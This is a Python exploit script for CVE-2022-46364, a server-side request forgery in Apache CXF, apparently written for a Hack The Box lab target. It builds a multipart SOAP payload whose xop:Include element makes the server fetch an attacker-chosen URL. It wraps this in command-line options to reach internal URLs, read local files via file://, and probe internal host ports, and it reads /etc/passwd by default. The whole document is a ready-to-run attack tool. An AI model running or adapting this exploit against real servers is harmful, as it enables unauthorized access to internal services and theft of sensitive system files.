#!/usr/bin/env python3
"""
CVE-2022-46364 - Apache CXF SSRF via XOP:Include
Usage: python3 exploit.py -t http://target.com:8080 -e /employeeservice -u http://internal:8080/admin
"""

import requests
import argparse
import sys
from urllib.parse import urljoin

class CVE_2022_46364_Exploit:
    def __init__(self, target, endpoint):
        self.target_url = urljoin(target, endpoint)
        self.headers = {
            "Content-Type": "multipart/related; type=\"application/xop+xml\"; start=\"<root>\"; start-info=\"text/xml\"; boundary=\"boundary\""
        }
    
    def ssrf_request(self, target_url):
        """
        Perform SSRF by making the server request an arbitrary URL via xop:Include
        """
        payload = f'''--boundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/" xmlns:xop="http://www.w3.org/2004/08/xop/include">
   <soapenv:Header/>
   <soapenv:Body>
      <dev:submitReport>
         <arg0>
            <employeeName>ben</employeeName>
            <department>IT</department>
            <content><xop:Include href="{target_url}"/></content>
            <confidential>false</confidential>
         </arg0>
      </dev:submitReport>
   </soapenv:Body>
</soapenv:Envelope>
--boundary--
'''
        
        try:
            response = requests.post(
                self.target_url,
                headers=self.headers,
                data=payload,
                timeout=30
            )
            
            # Check if the response contains the target URL's content
            if response.status_code == 200:
                print(f"[+] SSRF request sent to: {target_url}")
                print("[+] Response from server:")
                print("-" * 50)
                print(response.text)  # Full respond
                print("-" * 50)
                return response.text
            else:
                print(f"[-] Request failed with status: {response.status_code}")
                return None
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Error: {e}")
            return None
    
    def read_local_file(self, file_path):
        """
        Read local file using file:// protocol (if XXE is also possible)
        """
        return self.ssrf_request(f"file://{file_path}")
    
    def scan_internal_network(self, host, port):
        """
        Scan internal network by attempting to connect to internal services
        """
        return self.ssrf_request(f"http://{host}:{port}")

def main():
    parser = argparse.ArgumentParser(description='CVE-2022-46364 - Apache CXF SSRF via XOP:Include')
    parser.add_argument('-t', '--target', required=True, help='Target server (e.g., http://devarea.htb:8080)')
    parser.add_argument('-e', '--endpoint', default='/employeeservice', help='SOAP endpoint path (default: /employeeservice)')
    parser.add_argument('-u', '--url', help='Internal URL to request via SSRF')
    parser.add_argument('-f', '--file', help='Local file to read (via file://)')
    parser.add_argument('-s', '--scan', help='Internal host to scan (e.g., 127.0.0.1:8080)')
    
    args = parser.parse_args()
    
    exploit = CVE_2022_46364_Exploit(args.target, args.endpoint)
    
    if args.url:
        # SSRF to arbitrary URL
        exploit.ssrf_request(args.url)
    elif args.file:
        # Read local file
        exploit.read_local_file(args.file)
    elif args.scan:
        # Scan internal network
        host, port = args.scan.split(':')
        exploit.scan_internal_network(host, port)
    else:
        # Default test - try to read /etc/passwd
        print("[*] No target specified, testing with /etc/passwd...")
        exploit.read_local_file("/etc/passwd")

if __name__ == "__main__":
    main()
